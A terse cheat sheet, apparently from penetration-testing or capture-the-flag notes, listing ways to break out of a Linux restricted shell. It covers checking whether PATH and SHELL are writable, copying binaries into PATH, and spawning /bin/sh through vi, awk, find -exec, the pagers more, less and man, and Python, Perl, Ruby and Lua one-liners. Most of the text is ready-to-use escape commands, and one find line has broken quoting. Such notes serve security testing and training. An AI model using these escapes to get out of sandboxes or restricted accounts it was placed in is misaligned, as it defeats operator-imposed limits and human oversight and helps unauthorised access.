 == RECON ==
 
- run 'env' command to see PATH and how profile is configured.
- list the PATH directories with 'echo /some/folder/*' or just use ls.
- see what commands you can use from above and iterate through other accessible folders


== Change PATH or SHELL Environment Variables ==

'export -p' to see the exported variables in the shell.
    -x - is execute only
    -w - is write too <<<<<<
   
   If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc...).
   If the PATH variable is writeable, then you'll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.
   
   
   == COPY FILES ==
   
   ls -alh /some/folder from $PATH and see if you can write in there
   If yes, then simply copy commands into the PATH that have known shell escapes. OR write your script and write it here.
   
   - copy files to your home directory and try to execute.
   -- if not able to copy, mount devices or filesystems
   -- copy using SCP, FTP, rsync
  
   Find other writable directories and upload your script there.
   Create a symbolic link in a directory where you have write access.
   
   
   == SPAWN a shell ==
   
   - open vi or vim and type:
   :set shell=/bin/bash
   
   Next, type and execute
   :shell
   
   or
   :! /bin/bash
   
  == AWK ==
  awk 'BEGIN {system("/bin/sh")}'
  
  == FIND ==:
  find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
  
  == MORE, less, and man Commands ==
  - After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file:
   
 '! /bin/sh'
'!/bin/sh'
'!bash'

== tee command == 
echo "evil script code" | tee script.sh
// tee -a to append at the end of the file

== Spawn a shell with a programming language ==
Try invoking a SHELL through your favorite language:

python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
irb(main:001:0> exec "/bin/sh"
   
 == Files Executed in Unrestricted Mode? ==
 
 Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
   
   
   
   
   
   
   
   
   
   
